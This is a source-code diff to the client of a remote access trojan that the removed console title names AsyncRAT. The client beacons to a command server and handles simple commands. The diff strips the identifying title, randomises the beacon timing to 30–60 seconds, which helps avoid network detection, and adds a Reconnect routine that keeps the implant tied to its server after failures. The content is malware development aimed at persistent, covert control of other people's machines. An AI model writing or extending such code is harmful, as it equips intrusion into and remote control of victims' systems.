@@ -29,7 +29,6 @@ namespace Client
 
         static void Main(string[] args)
         {
-            Console.Title = "AsyncRAT | Client";
             InitializeClient();
             while (true)
             {
@@ -54,18 +53,37 @@ namespace Client
                 MS = new MemoryStream();
                 BeginSend(SendInfo());
                 TimerCallback T = new TimerCallback(Ping);
-                Tick = new Timer(T, null, 15000, 30000);
+                Tick = new Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
                 client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
                 Console.WriteLine("Disconnected!");
-                Thread.Sleep(new Random().Next(5000));
-                try
+                Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
+                Reconnect();
+            }
+        }
+
+        public static void Reconnect()
+        {
+            if (client.Connected == false)
+            {
+                if (Tick != null)
                 {
+                    Tick.Dispose();
+                }
+
+                if (client != null)
+                {
+                    client.Close();
                     client.Dispose();
                 }
-                catch { }
+
+                if (MS != null)
+                {
+                    MS.Dispose();
+                }
+
                 InitializeClient();
             }
         }
@@ -85,11 +103,7 @@ namespace Client
             {
                 if (client.Connected == false)
                 {
-                    Tick.Dispose();
-                    client.Close();
-                    client.Dispose();
-                    MS.Dispose();
-                    InitializeClient();
+                    Reconnect();
                 }
 
                 int Recevied = client.EndReceive(ar);
@@ -132,21 +146,13 @@ namespace Client
                 }
                 else
                 {
-                    Tick.Dispose();
-                    client.Close();
-                    client.Dispose();
-                    MS.Dispose();
-                    InitializeClient();
+                    Reconnect();
                 }
                 client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
-                Tick.Dispose();
-                client.Close();
-                client.Dispose();
-                MS.Dispose();
-                InitializeClient();
+                Reconnect();
             }
         }
 
@@ -159,13 +165,14 @@ namespace Client
             {
                 case "MessageBox":
                     {
-                       Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+                        Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                     }
                     break;
 
                 case "Ping":
                     {
-                        Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+
+                        Console.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                     }
                     break;
             }
@@ -198,11 +205,7 @@ namespace Client
                 }
                 catch
                 {
-                    Tick.Dispose();
-                    client.Close();
-                    client.Dispose();
-                    MS.Dispose();
-                    InitializeClient();
+                    Reconnect();
                 }
             }
         }
@@ -214,7 +217,9 @@ namespace Client
                 client.EndSend(ar);
             }
             catch
-            { }
+            {
+                Reconnect();
+            }
         }
     }
 }
